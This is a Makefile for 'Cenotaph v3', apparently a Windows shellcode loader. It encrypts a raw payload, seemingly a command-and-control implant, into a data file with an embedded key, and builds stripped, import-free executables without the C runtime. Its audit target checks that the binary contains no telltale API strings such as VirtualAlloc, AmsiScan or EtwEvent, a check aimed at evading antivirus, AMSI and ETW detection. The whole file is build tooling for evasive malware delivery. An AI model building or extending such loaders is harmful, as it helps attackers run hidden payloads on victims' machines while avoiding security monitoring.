# Cenotaph v3 — clean-slate fallback loader.
#
#   make           -> cenotaph.exe     (release, windows subsystem, stripped)
#   make debug     -> cenotaph-debug.exe (console, for testing)
#   make audit     -> zero-import / string checks
#   make clean

CXX     := x86_64-w64-mingw32-g++
STRIP   := x86_64-w64-mingw32-strip
NM      := x86_64-w64-mingw32-nm
STRINGS := x86_64-w64-mingw32-strings
OBJDUMP := x86_64-w64-mingw32-objdump

SRC     := src/Ldr.c src/Utils.c src/Host.c
INC     := -Iinclude

# Compiler flags: no CRT, no exceptions, no unwind tables, no ident, no stack protector.
CFLAGS  := -Os -fno-asynchronous-unwind-tables -fno-exceptions -fno-rtti \
           -fno-builtin -fno-ident -fno-stack-protector -fpack-struct=8 \
           -mno-sse -fpermissive -masm=intel -Wall $(INC)

# Linker: no CRT, explicit entry, strip, console/windows as needed.
LDFLAGS_REL := -nostdlib -Wl,-e,CenotaphEntry -Wl,-s -Wl,-subsystem,windows
LDFLAGS_DBG := -nostdlib -Wl,-e,CenotaphEntry -Wl,-subsystem,console -lkernel32

OBJREL  := build/rel
OBJDBG  := build/dbg
OBJ_REL := $(patsubst src/%.c,$(OBJREL)/%.o,$(SRC))
OBJ_DBG := $(patsubst src/%.c,$(OBJDBG)/%.o,$(SRC))

.PHONY: all debug payload audit clean

all: cenotaph.exe

debug: cenotaph-debug.exe

# Encrypt a raw payload into the .dat + regenerate the embedded key header.
# ALWAYS rebuild afterwards so the binary embeds the matching key:
#   make payload PAYLOAD=NaX/build/nax.x64.debug.bin DAT=cenotaph-debug.dat
#   make debug && make
PAYLOAD ?= build/nax.x64.bin
DAT     ?= cenotaph-debug.dat
payload:
	python3 tools/encrypt.py --payload $(PAYLOAD) --dat $(DAT) --header include/CenKey.h
	@echo "[!] key changed - rebuild now: make debug && make"

$(OBJREL):
	mkdir -p $(OBJREL)

$(OBJDBG):
	mkdir -p $(OBJDBG)

$(OBJREL)/%.o: src/%.c | $(OBJREL)
	$(CXX) $(CFLAGS) -c $< -o $@

$(OBJDBG)/%.o: src/%.c | $(OBJDBG)
	$(CXX) $(CFLAGS) -DCENOTAPH_DEBUG=1 -g -c $< -o $@

# Host.c embeds the key; a regenerated CenKey.h must force a rebuild.
$(OBJREL)/Host.o $(OBJDBG)/Host.o: include/CenKey.h

cenotaph.exe: $(OBJ_REL)
	$(CXX) $(CFLAGS) $(OBJ_REL) -o $@ $(LDFLAGS_REL)
	$(STRIP) $@ 2>/dev/null || true

cenotaph-debug.exe: $(OBJ_DBG)
	$(CXX) $(CFLAGS) -DCENOTAPH_DEBUG=1 -g $(OBJ_DBG) -o $@ $(LDFLAGS_DBG)

audit: cenotaph.exe
	@echo "=== size ==="; ls -l cenotaph.exe | awk '{print $$5" bytes"}'
	@echo "=== imports (must be EMPTY) ==="; \
	  $(OBJDUMP) -p cenotaph.exe | awk '/The Import Tables/{flag=1} flag' | head -20 ; \
	  $(OBJDUMP) -p cenotaph.exe | grep -E 'DLL Name|\.dll' || echo "(none - PASS)"
	@echo "=== API strings (must be EMPTY) ==="; \
	  $(STRINGS) -a cenotaph.exe | grep -iE 'NtAllocate|NtProtect|NtClose|VirtualAlloc|VirtualProtect|LoadLibrary|GetProcAddress|CreateFile|ReadFile|GetModuleFileName|GetFileSize|Sleep|CloseHandle|AmsiScan|EtwEvent' || echo "(empty - PASS)"
	@echo "=== undefineds (must be empty) ==="; \
	  $(NM) -u cenotaph.exe 2>/dev/null || echo "(none)"

clean:
	rm -rf build cenotaph.exe cenotaph-debug.exe
